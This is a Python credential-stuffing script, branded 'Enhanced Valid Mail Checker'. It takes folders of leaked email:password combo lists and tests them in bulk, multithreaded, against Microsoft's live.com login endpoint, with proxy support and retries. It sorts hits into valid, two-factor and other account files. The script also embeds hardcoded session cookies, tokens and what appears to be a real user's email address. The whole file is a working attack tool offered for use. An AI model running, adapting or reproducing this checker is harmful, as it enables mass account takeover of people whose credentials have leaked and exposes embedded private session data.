import os
import re
import time
import threading
import concurrent.futures
from colorama import Fore, init
from urllib.parse import urlparse, parse_qs
import requests
import urllib3

# Disable HTTPS warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
init(autoreset=True)

# ASCII ART LOGO
logo = f"""{Fore.CYAN}
 $$$$$$\  $$\       $$\        $$$$$$\ $$\     $$\ 
$$  __$$\ $$ |      $$ |      $$  __$$\\$$\   $$  |
$$ /  $$ |$$ |      $$ |      $$ /  $$ |\$$\ $$  / 
$$$$$$$$ |$$ |      $$ |      $$$$$$$$ | \$$$$  /  
$$  __$$ |$$ |      $$ |      $$  __$$ |  \$$  /   
$$ |  $$ |$$ |      $$ |      $$ |  $$ |   $$ |    
$$ |  $$ |$$$$$$$$\ $$$$$$$$\ $$ |  $$ |   $$ |    
\__|  \__|\________|\________|\__|  \__|   \__|     
{Fore.RESET}"""

# Stats
stats = {
    'total': 0,
    'valid': 0,
    'bad': 0,
    'twofa': 0,
    'custom': 0,
    'checked': 0,
    'errors': 0,
    'cpm': 0,
    'active_threads': 0,
    'files_processed': 0,
    'retries': 0
}

# Enhanced MailHub Class
class MailHub:
    def __init__(self):
        """
        Dev --> Not-ISellStuff
        Enhanced Microsoft login checker
        """
        self.headersMICROSOFT = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "MicrosoftApplicationsTelemetryDeviceId=920e613f-effa-4c29-8f33-9b639c3b321b; MSFPC=GUID=1760ade1dcf744b88cec3dccf0c07f0d&HASH=1760&LV=202311&V=4&LU=1701108908489; mkt=ar-SA; IgnoreCAW=1; MUID=251A1E31369E6D281AED0DE737986C36; MSCC=197.33.70.230-EG; MSPBack=0; NAP=V=1.9&E=1cca&C=sD-vxVi5jYeyeMkwVA7dKII2IAq8pRAa4DmVKHoqD1M-tyafuCSd4w&W=2; ANON=A=D086BC080C843D7172138ECBFFFFFFFF&E=1d24&W=2; SDIDC=CVbyEkUg8GuRPdWN!EPGwsoa25DdTij5DNeTOr4FqnHvLfbt1MrJg5xnnJzsh!HecLu5ZypjM!sZ5TtKN5sdEd2rZ9rugezwzlcUIDU5Szgq7yMLIVdfna8dg3sFCj!kQaXy2pwx6TFwJ7ar63EdVIz*Z3I3yVzEpbDMlVRweAFmG1M54fOyH0tdFaXs5Mk*7WyS05cUa*oiyMjqGmeFcnE7wutZ2INRl6ESPNMi8l98WUFK3*IKKZgUCfuaNm8lWfbBzoWBy9F3hgwe9*QM1yi41O*rE0U0!V4SpmrIPRSGT5yKcYSEDu7TJOO1XXctcPAq21yk*MnNVrYYfibqZvnzRMvTwoNBPBKzrM6*EKQd6RKQyJrKVdEAnErMFjh*JKgS35YauzHTacSRH6ocroAYtB0eXehx5rdp2UyG5kTnd8UqA00JYvp4r1lKkX4Tv9yUb3tZ5vR7JTQLhoQpSblC4zSaT9R5AgxKW3coeXxqkz0Lbpz!7l9qEjO*SdOm*5LBfF2NZSLeXlhol**kM3DFdLVyFogVq0gl0wR52Y02; MSPPre=imrozza%40outlook.com%7c8297dd0d702a14b0%7c%7c; MSPCID=8297dd0d702a14b0; MSPSoftVis=@:@; MSPRequ=id=N&lt=1701944501&co=0; uaid=a7afddfca5ea44a8a2ee1bba76040b3c; OParams=11O.DmVQflQtPeQAtoyExD*hjGXsJOLcnQHVlRoIaEDQfzrgMX2Lpzfa992qCQeIn0O8kdrgRfMm1kEmcXgJqSTERtHj0vlp9lkdMHHCEwZiLEOtxzmks55h!6RupAnHQKeVfVEKbzcTLMei4RMeW1drXQ0BepPQN*WgCK3ua!f6htixcJYNtwumc8f29KYtizlqh0lqQ3a2dZ4Kd!KDOneLTE512ScqObfQd5AGBu*xLbcRbg6xqh1eWCOXW!JOT6defiMqxBGPNL1kQUYgc5WAG8tmjMPFLqVn1*f4xws1NDhwmYOHPu!rS9dn*trC71knxMAfi5Tt69XZHdojgnuopBag*YM7uIBrhUyfxjR*4Zkyygfax9gMaxxG9KScOnPvemNY1ZfVH9Vm!IxQFKoPoKBdLVH5Jc7Eokycow31oq7vNcAbi!cS3Wby0LjzBdr8jq2Aqj3RlWfckJaRoReZ4nY34Gh*eVllAMrF*VQP1iQ7t*I28266q6OQGZ9Y1q53Ai72b!8H5wjQJIJw1XV4zwRO8J02gt6vIPpLBFiq!7IkawEubBPpynkQ3neDo92Tpc71Y*WrnD6H8ojgzxRAj!DIiyfyA7kJHJ7DU!XSg*Xo0L1!DRYSBV!PKwNM7MaBiqsKbRWFnFyzKhBACfiPe8dK5ZUGBSpFbUlpXkUJOb247ewTWAsl9D4G6mezVjGY1u9uOYUPc3ZqTEBFRf4TK94CllbiMRC0v26W*qlwOl0SSpBufo8MtOUqvowUFqEWDDVl9WFV5bT2zZVUy4kPj9a*3YNnskgZghnOCtQYKIIRdFTWgL*DcbQ4XRL8hMisBDjyniS16W2P!1FH0dT12w7RlsJCdotQSK1WppX8sGWNrPrYNcih5ErXVZtYKbqrZLw2EcyGmkp7NxBHFUQXx*1tZSEeiWoZ5BrHSiEB7X2gB7BQDP7RbVYZS5UXeNp3rlGdN*5!nUGK3Fltm1sKFmtZU!T1Q0WaeFwVvpFYSCxg9uw6CC!va2dB*R6NFK!3GNBDrCvbXnJMaKVb!UoBP5G*GASdPnuJgb3cjUE*DIYMJRrPT!dZoHd5BAQSF3vBoPZasphWeflxXFMPBi055OBEawIzxOqS6Wn3IZCp3dgk8QLNssATkzwZvpUM5lSq710QTMZWENDKp5gTIlWcdYpKG1d8TmRlqXRJN7bdUuRIoehIWqnfSuJxGoNk6PM3x3!gMaxPxe1Ch6hMmsagHM8fFQ!MpP0TQ9nsIxh1goCaL*PbHDyj1U3btyu2RXibwIwgV1h5A6DgwmgbaH1Hn9LpdLipiT5fGiRbI903!wYUA3MgQg98OH9BQaJPXte1YpL8iUjUA9MreaZTQ5P13cUiNYrkTW2jVr5PTpEJvwpg*8piWEo9k*IzOCr6iKMRiZwTft*QYEEaKxbyvgLG*s33uhCN46R9J1VwPufzsxyGUHYyE5S1mhx8sWxw!pndIQ!RgVEsDfzvOO0H2P1hBGQG8npJ18th2WKYrvouqHZfRBcEc77hsbXUKec2lv4ETHag0RdrT6kFn03RDX*p*Hac*nugVJK1j0GouxkITbOmMjb8cpau*Lf*xNBUFc3roCuPjEpAcR48X51rIGpOjhAe56Q6CbwIuVe*z*KmRptzngkT4!AB*FGGKh2lOi6b0qR1w4Aia2g1pfjJU2G1r*Q!kSNxYtGn0WOkHiVkhAXQCvkNFp3q!ivZs3obM!0ffg$$; ai_session=6FvJma4ss/5jbM3ZARR4JM|1701943445431|1701944504493; MSPOK=$uuid-d9559e5d-eb3c-4862-aefb-702fdaaf8c62$uuid-d48f3872-ff6f-457e-acde-969d16a38c95$uuid-c227e203-c0b0-411f-9e65-01165bcbc281$uuid-98f882b7-0037-4de4-8f58-c8db795010f1$uuid-0454a175-8868-4a70-9822-8e509836a4ef$uuid-ce4db8a3-c655-4677-a457-c0b7ff81a02f$uuid-160e65e0-7703-4950-9154-67fd0829b36",
            "Origin": "https://login.live.com",
            "Referer": "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=eyJpZCI6IjAzZDZhYmM1NDIzMjQ2Yjg5MWNhYmM2ODg0ZGNmMGMzIn0%3D&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        }
        self.failMICROSOFT = [
            "Your account or password is incorrect.",
            "That Microsoft account doesn\\'t exist. Enter a different account",
            "Sign in to your Microsoft account",
            'Please sign in with a Microsoft account or create a new account'
        ]
        self.retryMICROSOFT = [",AC:null,urlFedConvertRename", "Too Many Requests"]
        self.nfaMICROSOFT = [
            "account.live.com/recover?mkt",
            "recover?mkt",
            "account.live.com/identity/confirm?mkt",
            "Email/Confirm?mkt",
            "Help us protect your account"
        ]
        self.customMICROSOFT = ["/cancel?mkt=", "/Abuse?mkt="]
        self.hitsMICROSOFT = ['sSigninName', 'PPAuth', 'WLSSC', 'name="ANON"']

    def found(self, keywords, resp):
        """Check if any keyword exists in response text"""
        for keyword in keywords:
            if keyword in resp:
                return True
        return False

    def payloadMICROSOFT(self, email, password):
        """Generate payload for Microsoft login"""
        payload = {
            "i13": "0",
            "login": email,
            "loginfmt": email,
            "type": "11",
            "LoginOptions": "3",
            "lrt": "",
            "lrtPartition": "",
            "hisRegion": "",
            "hisScaleUnit": "",
            "passwd": password,
            "ps": "2",
            "psRNGCDefaultType": "1",
            "psRNGCEntropy": "",
            "psRNGCSLK": "-DiygW3nqox0vvJ7dW44rE5gtFMCs15qempbazLM7SFt8rqzFPYiz07lngjQhCSJAvR432cnbv6uaSwnrXQ*RzFyhsGXlLUErzLrdZpblzzJQawycvgHoIN2D6CUMD9qwoIgR*vIcvH3ARmKp1m44JQ6VmC6jLndxQadyaLe8Tb!ZLz59Te6lw6PshEEM54ry8FL2VM6aH5HPUv94uacHz!qunRagNYaNJax7vItu5KjQ",
            "canary": "",
            "ctx": "",
            "hpgrequestid": "",
            "PPFT": "-DjzN1eKq4VUaibJxOt7gxnW7oAY0R7jEm4DZ2KO3NyQh!VlvUxESE5N3*8O*fHxztUSA7UxqAc*jZ*hb9kvQ2F!iENLKBr0YC3T7a5RxFF7xUXJ7SyhDPND0W3rT1l7jl3pbUIO5v1LpacgUeHVyIRaVxaGUg*bQJSGeVs10gpBZx3SPwGatPXcPCofS!R7P0Q$$",
            "PPSX": "Passp",
            "NewUser": "1",
            "FoundMSAs": "",
            "fspost": "0",
            "i21": "0",
            "CookieDisclosure": "0",
            "IsFidoSupported": "1",
            "isSignupPost": "0",
            "isRecoveryAttemptPost": "0",
            "i19": "21648"
        }
        return payload

    def loginMICROSOFT(self, email, password, proxy=None, max_retries=3):
        """Perform Microsoft login with retry logic"""
        for attempt in range(max_retries):
            try:
                session = requests.Session()
                session.verify = False
                session.headers.update(self.headersMICROSOFT)
                
                # Generate fresh payload
                payload = self.payloadMICROSOFT(email, password)
                
                if proxy:
                    r = session.post(
                        "https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216",
                        data=payload,
                        timeout=30,
                        proxies=proxy
                    )
                else:
                    r = session.post(
                        "https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216",
                        data=payload,
                        timeout=30
                    )

                if self.found(self.hitsMICROSOFT, r.text):
                    return "valid", r.cookies.get("X-OWA-CANARY", "")

                if self.found(self.nfaMICROSOFT, r.text):
                    return "twofa", ""

                if self.found(self.customMICROSOFT, r.text):
                    return "custom", ""

                if self.found(self.failMICROSOFT, r.text):
                    return "bad", ""

                if self.found(self.retryMICROSOFT, r.text):
                    if attempt < max_retries - 1:
                        time.sleep(2)
                        continue
                    return "error", ""

                # Default to valid if none of the patterns match
                return "valid", ""

            except requests.exceptions.Timeout:
                if attempt < max_retries - 1:
                    time.sleep(2)
                    continue
                return "error", "timeout"
            except requests.exceptions.ConnectionError:
                if attempt < max_retries - 1:
                    time.sleep(2)
                    continue
                return "error", "connection"
            except Exception as e:
                if attempt < max_retries - 1:
                    time.sleep(2)
                    continue
                return "error", str(e)
            finally:
                try:
                    session.close()
                except:
                    pass
        
        return "error", "max_retries_exceeded"

def clear_screen():
    os.system('clear' if os.name != 'nt' else 'cls')

def update_title():
    """Update the title with current stats"""
    while True:
        cpm = stats['cpm']
        stats['cpm'] = 0
        status = (f"Checked: {stats['checked']}/{stats['total']} | "
                  f"Valid: {stats['valid']} | Bad: {stats['bad']} | "
                  f"2FA: {stats['twofa']} | Custom: {stats['custom']} | "
                  f"CPM: {cpm*60} | Threads: {stats['active_threads']} | "
                  f"Retries: {stats['retries']}")
        print(f"\r{Fore.CYAN}{status}{Fore.RESET}", end="", flush=True)
        time.sleep(1)

def check_account(email, password):
    """Check account using enhanced MailHub class"""
    mailhub = MailHub()
    result, details = mailhub.loginMICROSOFT(email, password)
    return result

def process_combo(combo, filename):
    """Process a single email:password combo"""
    stats['active_threads'] += 1
    try:
        combo = combo.strip()
        if not combo or ':' not in combo:
            return
        
        email, password = combo.replace(' ', '').split(":", 1)
        if not email or not password:
            stats['bad'] += 1
            save_result(filename, "Bad.txt", combo)
            print(f"\n{Fore.RED}BAD  : {combo}{Fore.RESET}")
            return
        
        result = check_account(email, password)
        stats['checked'] += 1
        stats['cpm'] += 1
        
        if result == "valid":
            stats['valid'] += 1
            save_result(filename, "Valid.txt", combo)
            print(f"\n{Fore.GREEN}VALID: {email}:{password}{Fore.RESET}")
        elif result == "twofa":
            stats['twofa'] += 1
            save_result(filename, "2FA.txt", combo)
            print(f"\n{Fore.YELLOW}2FA : {email}:{password}{Fore.RESET}")
        elif result == "custom":
            stats['custom'] += 1
            save_result(filename, "Custom.txt", combo)
            print(f"\n{Fore.MAGENTA}CUSTOM: {email}:{password}{Fore.RESET}")
        elif result == "bad":
            stats['bad'] += 1
            save_result(filename, "Bad.txt", combo)
            print(f"\n{Fore.RED}BAD  : {email}:{password}{Fore.RESET}")
        else:
            stats['errors'] += 1
            stats['retries'] += 1
            # Retry the failed combo
            save_result(filename, "Retry.txt", combo)
            print(f"\n{Fore.WHITE}RETRY: {email}:{password}{Fore.RESET}")
            
    except Exception as e:
        stats['bad'] += 1
        stats['checked'] += 1
        stats['cpm'] += 1
        save_result(filename, "Bad.txt", combo)
        print(f"\n{Fore.RED}BAD  : {combo.strip()}{Fore.RESET}")
    finally:
        stats['active_threads'] -= 1

def save_result(filename, result_file, combo):
    """Save result to appropriate file"""
    result_dir = os.path.join("results", os.path.splitext(filename)[0])
    os.makedirs(result_dir, exist_ok=True)
    with open(os.path.join(result_dir, result_file), 'a', encoding='utf-8') as f:
        f.write(f"{combo.strip()}\n")

def load_files_from_folder(folder_path):
    """Load all .txt files from folder"""
    combos = {}
    for filename in os.listdir(folder_path):
        if filename.lower().endswith('.txt'):
            filepath = os.path.join(folder_path, filename)
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = [line.strip() for line in f.readlines() if ':' in line]
                    unique_lines = list(set(lines))
                    combos[filename] = unique_lines
                    stats['total'] += len(unique_lines)
                    stats['files_processed'] += 1
                    print(f"{Fore.BLUE}Loaded {len(unique_lines)} combos from {filename}{Fore.RESET}")
            except Exception as e:
                print(f"{Fore.RED}Error reading file {filename}: {str(e)}{Fore.RESET}")
    return combos

def main():
    clear_screen()
    print(logo)
    print(f"{Fore.CYAN}ALPHA DEV | Enhanced Valid Mail Checker | MailHub Integration{Fore.RESET}")
    print(f"{Fore.YELLOW}Using enhanced Microsoft login detection...{Fore.RESET}\n")

    # Get folder path
    while True:
        folder_path = input(f"{Fore.BLUE}Enter folder path containing .txt files: {Fore.RESET}").strip()
        if os.path.isdir(folder_path):
            break
        print(f"{Fore.RED}Invalid folder path. Try again.{Fore.RESET}")

    # Get thread count
    while True:
        try:
            threads = int(input(f"{Fore.BLUE}Enter number of threads (1-30 recommended): {Fore.RESET}"))
            if 1 <= threads <= 50:
                break
            print(f"{Fore.RED}Enter between 1 and 50 threads.{Fore.RESET}")
        except:
            print(f"{Fore.RED}Invalid input. Please enter a number.{Fore.RESET}")

    # Start stats updater
    threading.Thread(target=update_title, daemon=True).start()

    print(f"\n{Fore.BLUE}Loading files from {folder_path}...{Fore.RESET}")
    combos = load_files_from_folder(folder_path)

    if not combos:
        print(f"{Fore.RED}No valid .txt files found in the folder.{Fore.RESET}")
        input("Press Enter to exit...")
        return

    print(f"\n{Fore.GREEN}✓ Loaded {stats['files_processed']} files with {stats['total']} total combos.{Fore.RESET}")
    print(f"{Fore.MAGENTA}✓ Results will be saved in /results/[filename]/ folder{Fore.RESET}")
    print(f"{Fore.YELLOW}✓ Starting checking process with {threads} threads...\n{Fore.RESET}")

    start_time = time.time()

    # Process all combos
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        for filename, file_combos in combos.items():
            print(f"{Fore.CYAN}▶ Processing {filename} ({len(file_combos)} combos){Fore.RESET}")
            futures = [executor.submit(process_combo, combo, filename) for combo in file_combos]
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"{Fore.RED}Thread error: {str(e)}{Fore.RESET}")

    # Calculate final stats
    minutes, seconds = divmod(time.time() - start_time, 60)
    hours, minutes = divmod(minutes, 60)
    
    if minutes == 0:
        time_taken = f"{int(seconds)}s"
    elif hours == 0:
        time_taken = f"{int(minutes)}m {int(seconds)}s"
    else:
        time_taken = f"{int(hours)}h {int(minutes)}m {int(seconds)}s"

    # Display final results
    print(f"\n{Fore.GREEN}{'='*50}{Fore.RESET}")
    print(f"{Fore.GREEN}✓ Check Complete!{Fore.RESET}")
    print(f"{Fore.GREEN}{'='*50}{Fore.RESET}")
    print(f"{Fore.CYAN}Total Files Processed: {stats['files_processed']}")
    print(f"{Fore.CYAN}Total Combos Checked: {stats['total']}")
    print(f"{Fore.GREEN}✓ Valid Accounts: {stats['valid']}")
    print(f"{Fore.YELLOW}⚠ 2FA Accounts: {stats['twofa']}")
    print(f"{Fore.MAGENTA}⚡ Custom Accounts: {stats['custom']}")
    print(f"{Fore.RED}✗ Bad Accounts: {stats['bad']}")
    print(f"{Fore.WHITE}↻ Retry Needed: {stats['retries']}")
    print(f"{Fore.RED}⚠ Errors: {stats['errors']}")
    print(f"{Fore.BLUE}⏱ Time taken: {time_taken}")
    
    # Calculate average CPM
    total_seconds = (time.time() - start_time)
    if total_seconds > 0:
        avg_cpm = (stats['checked'] / total_seconds) * 60
        print(f"{Fore.CYAN}📊 Average CPM: {int(avg_cpm)}")
    
    print(f"{Fore.GREEN}✓ Results saved in 'results' folder.{Fore.RESET}")
    print(f"{Fore.YELLOW}Each file's results are in separate subfolders.{Fore.RESET}")
    
    input(f"\n{Fore.CYAN}Press Enter to exit...{Fore.RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}⚠ Interrupted by user.{Fore.RESET}")
        print(f"{Fore.YELLOW}Partial results saved in 'results' folder.{Fore.RESET}")
    except Exception as e:
        print(f"\n{Fore.RED}⚠ Unexpected Error: {str(e)}{Fore.RESET}")
        import traceback
        traceback.print_exc()
    finally:
        print(f"\n{Fore.CYAN}Thanks for using Enhanced Mail Checker!{Fore.RESET}")
